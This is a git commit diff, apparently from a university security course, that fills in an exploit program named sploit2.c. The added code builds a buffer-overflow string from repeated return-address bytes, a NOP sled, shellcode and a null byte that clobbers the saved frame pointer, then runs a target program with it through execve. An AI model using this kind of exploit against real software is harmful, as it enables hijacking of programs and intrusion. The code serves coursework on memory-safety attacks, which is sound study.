e467240f2e364266b3b5a90a6a255676ab55f9d3
ab <arbeers@wisc.edu>
2023-02-11 15:29:14 -0600

    sploit2 done

--- sploits/sploit2.c
+++ sploits/sploit2.c
@@ -10,8 +10,19 @@ int main(void)
 {
   char *args[3];
   char *env[1];
+  
+  char crack_str[202];
+  int i;
+  
+  for(i = 0; i < 104; i+=4) strcpy(&crack_str[i], "\x4d\xfd\xff\xbf"); //eip
+  for(;i < 155; i++) crack_str[i] = '\x90'; //nop sled
+  strcpy(&crack_str[i], shellcode);
+  crack_str[200] = '\x00'; //zero out lsb of $ebp
+  crack_str[201] = '\0';
 
-  args[0] = TARGET; args[1] = "hi there"; args[2] = NULL;
+  args[0] = TARGET;
+  args[1] = crack_str;
+  args[2] = NULL;
   env[0] = NULL;
 
   if (0 > execve(TARGET, args, env))
